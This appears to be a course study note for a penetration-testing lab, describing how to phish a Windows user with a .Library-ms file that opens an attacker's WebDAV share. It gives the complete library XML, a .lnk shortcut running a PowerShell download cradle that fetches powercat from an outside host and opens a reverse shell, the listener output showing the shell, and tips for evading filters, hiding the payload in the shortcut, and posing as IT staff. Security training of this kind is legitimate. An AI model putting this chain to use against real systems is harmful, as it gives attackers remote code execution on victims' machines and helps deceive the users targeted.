## Why library files instead of a direct link

Malicious macros are increasingly caught — security products scan for them, Microsoft ships GPO templates specifically to restrict them, and security-awareness training singles them out. **Windows library files** (`.Library-ms`) are a lesser-known alternative that sidesteps a lot of that scrutiny.

A library file is an XML container that tells Windows Explorer to render a remote location (a WebDAV share, in this case) as if it were a normal local folder. Sending a raw link instead has an inherent weakness: spam filters and security tooling actively analyze link contents and file types before the target ever sees them. A `.Library-ms` file, by contrast, is commonly passed straight through to the user — Explorer just renders whatever the file points at, no different-looking from any other folder shortcut.

> [!info] Two-stage design
> **Stage 1** — the `.Library-ms` file gets the victim to open a WebDAV share that *looks* local. **Stage 2** — a `.lnk` shortcut sitting inside that share, which the victim double-clicks to actually trigger code execution. The library file itself does nothing malicious on its own; it just sets the stage.

## Stage 1 — standing up the WebDAV share

Install and run **WsgiDAV** on Kali as the WebDAV server:

```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

| Flag | Purpose |
|------|---------|
| `--host=0.0.0.0` | Listen on all interfaces |
| `--port=80` | Serving port |
| `--auth=anonymous` | No credentials required to browse/write |
| `--root /home/kali/webdav/` | Directory served as the WebDAV root |

Confirm it's up by browsing to `http://127.0.0.1` — `test.txt` should be visible.

## Building the library file's XML

RDP into the build VM (`xfreerdp /v:<CLIENT-IP> /u:offsec /p:lab`) and open **Visual Studio Code** (Notepad also works). `File → New Text File → Save As → config.Library-ms` on the desktop.

> [!warning] Saving with the extension alone changes the icon
> The moment the file is saved as `.Library-ms`, Explorer assigns it a distinct icon — not overtly dangerous-looking, but also not one Windows uses commonly, which can itself raise suspicion. Worth deliberately overriding it (see `iconReference` below) to blend in.

A library file has three parts: **general info**, **properties**, and **locations** — all XML, namespaced to the Windows 7+ library format:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
</libraryDescription>
```

**Name and version** — the name isn't an arbitrary string, it's a DLL+resource-index reference. `@windows.storage.dll,-34582` is used here instead of the `shell32.dll` equivalent specifically to dodge naive text-based filters that flag on "shell32":

```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

**Pinning and icon** — pin the library to Explorer's navigation pane for extra legitimacy, and override the icon with a benign-looking one (Pictures folder icon, `imageres.dll,-1003`):

```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```

**Template info** — a GUID that controls which columns/details Explorer shows for the opened library. The Documents GUID is used here to look as ordinary as possible:

```xml
<templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```

**Search connector / location** — the actual payload: a `searchConnectorDescription` pointing `url` at the Kali WebDAV share over HTTP:

```xml
<searchConnectorDescriptionList>
    <searchConnectorDescription>
        <isDefaultSaveLocation>true</isDefaultSaveLocation>
        <isSupported>false</isSupported>
        <simpleLocation>
            <url>http://192.168.119.2</url>
        </simpleLocation>
    </searchConnectorDescription>
</searchConnectorDescriptionList>
```

Full assembled file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.119.2</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

Save and double-click `config.Library-ms`. Explorer opens it and shows `test.txt` from the Kali WebDAV share — confirming the connection works. The address bar just shows `config`, with no visible indication the content is remote at all.

> [!success] What working stage 1 looks like
> Double-clicking `config.Library-ms` opens what looks like an ordinary folder, showing files that actually live on Kali's WebDAV share — no browser, no visible URL, no obvious network indicator.

## The self-mutation gotcha

Reopening the library file in VS Code afterward reveals Windows has **rewritten it**: a new `serialized` (base64) tag has appeared, and the `url` value changed from `http://192.168.119.2` to `\\192.168.119.2\DavWWWRoot`. Windows optimizes the connection info for its native WebDAV client once it's been opened once.

> [!danger] This can silently break the attack
> The mutated file still works on the machine that triggered the rewrite, but the `serialized` tag's encoded state may not transfer cleanly to other machines or survive a restart — Explorer can end up showing an empty share. **Fix:** before sending the file out again, paste the original XML back in to reset it to a known-good state. This has to be repeated every time the file is reused for testing, though in a real engagement the victim typically only needs to open it once.

## Stage 2 — the shortcut payload

On the desktop of the build VM: right-click → **New → Shortcut**. The "location of the item" field accepts an arbitrary command line — point it at PowerShell running the same download-cradle-plus-PowerCat pattern as [[Leveraging Microsoft Word macros]]:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
```

Name the shortcut something benign, e.g. `automatic_configuration`, and finish the wizard.

> [!tip] Hiding the payload from a suspicious user
> If a target might right-click and check the shortcut's Properties before running it, pad the command with a delimiter and an innocuous trailing command — the property window's visible field is narrow, so the malicious portion scrolls out of view and only the harmless tail is visible at a glance.

**On Kali**, before testing:

```bash
python3 -m http.server 80    # serves powercat.ps1
nc -nvlp 4444                 # catches the shell
```

> [!info] Why not host PowerCat on the WebDAV share itself?
> The WebDAV share is writable — hosting the payload there risks it getting scanned, quarantined, or removed by AV/security tooling. Locking the share to read-only would fix that, but at the cost of losing it as a channel for pulling files *off* target systems. A separate Python web server for payload hosting keeps both capabilities intact.

Double-clicking the shortcut on the desktop (after confirming the "Open File" warning) triggers the chain — the listener catches a shell:

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

## Putting it together against a real target

1. Copy `automatic_configuration.lnk` and the **reset** `config.Library-ms` into the Kali WebDAV directory (`/home/kali/webdav`), removing the leftover `test.txt` first.
2. Start all three services on Kali: `wsgidav` (WebDAV), `python3 -m http.server 80` (PowerCat), `nc -nvlp 4444` (listener).
3. Deliver `config.Library-ms` to the target. In this lab, delivery is simulated via an accessible SMB share instead of email:
   ```bash
   cd webdav
   rm test.txt
   smbclient //<TARGET-IP>/share -c 'put config.Library-ms'
   ```
4. The pretext matters as much as the payload — e.g. posing as new IT staff rolling out a "configuration tool," instructing the target to open the library file's folder and double-click the shortcut inside it.
5. When the simulated user runs it, the listener catches the shell:
   ```
   PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
   hr137\hsmith
   ```

> [!tip] Chainable with other vectors
> Nothing stops combining this with the Office macro technique from [[Leveraging Microsoft Word macros]] — e.g. a `.Library-ms` stage 1 delivering a weaponized document as stage 2 instead of a raw `.lnk`.

> [!danger] Common pitfalls
> - Forgetting the library file mutates itself after first use — resend a stale mutated copy and the victim gets an empty folder.
> - Hosting the PowerCat payload directly on the writable WebDAV share, risking AV quarantine.
> - Using a literal/arbitrary string for the `name` tag instead of a proper DLL+index reference.
> - Not resetting/removing test files (`test.txt`) from the WebDAV root before it goes "live" against a real target.

> [!tip] Beginner note
> `DavWWWRoot` is the internal name Windows' native WebDAV redirector uses once it recognizes a UNC path as a WebDAV connection — seeing `\\<ip>\DavWWWRoot` after Windows "optimizes" the library file is expected, not a sign anything broke by itself.

## Lab question answers

**"Is the `.lnk` file tagged with the Mark of the Web when you execute it in Explorer by double-clicking the Windows library file?"** → **True** — confirmed hands-on. Even though the connection resolves to a `\\<ip>\DavWWWRoot` UNC-style path, Windows' **URL security zone mapping** still classifies a WebDAV host reached over plain HTTP as the **Internet zone** by default (it isn't in Trusted/Local Intranet zones), so the `.lnk` picked up from that share still gets a `Zone.Identifier` alternate data stream — MOTW is applied.

> [!info] MOTW being present ≠ the attack being blocked
> The reason this technique still works despite MOTW landing on the `.lnk`: **Windows doesn't gate `.lnk` execution behind MOTW** the way it gates Office macros (Protected View) or downloaded `.exe`/installer files (SmartScreen prompt). Double-clicking a MOTW-tagged shortcut just runs whatever it points to — no extra warning dialog in the way. So the real value of this vector isn't "it evades MOTW entirely" (it doesn't) — it's that `.lnk`/library files fall into file-type categories Windows doesn't bother gatekeeping on MOTW in the first place, unlike the Office macro vector where MOTW directly triggers Protected View.
>
> Verify it yourself: right-click the `.lnk` inside the opened library folder → Properties (no Unblock checkbox shown for this file type — the UI doesn't surface MOTW for shortcuts the way it does for documents).

> [!warning] Querying the stream directly over the WebDAV UNC path fails
> ```powershell
> Get-Item -Path "\\<kali-ip>\DavWWWRoot\automatic_configuration.lnk" -Stream Zone.Identifier
> # Get-Item : Insufficient system resources exist to complete the requested service
> ```
> This isn't "no MOTW" — it's the **WebClient/WebDAV redirector** rejecting the stream-enumeration request entirely; querying NTFS alternate data streams isn't supported over that protocol. To actually see the stream, copy the file out to a real local NTFS path **using Explorer's UI** (drag-and-drop or right-click Copy/Paste — `Copy-Item` in PowerShell skips ADS by default and won't carry it over) and check the local copy instead:
> ```powershell
> Get-Item -Path "C:\Users\offsec\Desktop\automatic_configuration.lnk" -Stream Zone.Identifier
> ```
> This mirrors what Windows actually does to execute a WebDAV-hosted file anyway — cache it locally first — and that local, Explorer-copied version is where the `Zone.Identifier` stream (MOTW) shows up.

> [!info] Hands-on labs
